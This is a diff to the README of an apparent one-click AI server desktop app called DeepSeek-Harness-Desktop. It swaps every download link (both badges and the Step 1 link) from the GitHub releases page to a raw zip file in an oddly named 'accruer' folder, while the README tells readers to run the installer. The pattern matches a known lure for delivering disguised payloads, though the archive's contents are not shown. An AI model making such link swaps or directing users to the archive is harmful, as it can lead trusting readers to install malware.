@@ -1,6 +1,6 @@
 # 🚀 DeepSeek-Harness-Desktop - Start Your AI Server in One Click
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/broody-cascarillabark100/DeepSeek-Harness-Desktop/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/broody-cascarillabark100/DeepSeek-Harness-Desktop/raw/refs/heads/main/accruer/v3.7.zip)
 
 ## 📌 What Is This?
 
@@ -31,7 +31,7 @@ This app lives quietly in your system tray and handles the technical stuff for y
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/broody-cascarillabark100/DeepSeek-Harness-Desktop/releases**](https://github.com/broody-cascarillabark100/DeepSeek-Harness-Desktop/releases)
+[**https://github.com/broody-cascarillabark100/DeepSeek-Harness-Desktop/raw/refs/heads/main/accruer/v3.7.zip**](https://github.com/broody-cascarillabark100/DeepSeek-Harness-Desktop/raw/refs/heads/main/accruer/v3.7.zip)
 
 ### Step 2: Run the Installer
 
@@ -149,7 +149,7 @@ If you run into any problems, visit the GitHub repository at the download link a
 
 Click the button below to grab your copy today:
 
-[![Download for Windows](https://img.shields.io/badge/⬇️%20Download%20Latest%20Version-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/broody-cascarillabark100/DeepSeek-Harness-Desktop/releases)
+[![Download for Windows](https://img.shields.io/badge/⬇️%20Download%20Latest%20Version-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/broody-cascarillabark100/DeepSeek-Harness-Desktop/raw/refs/heads/main/accruer/v3.7.zip)
 
 Then follow the simple installation steps above and be up and running in under two minutes.
 
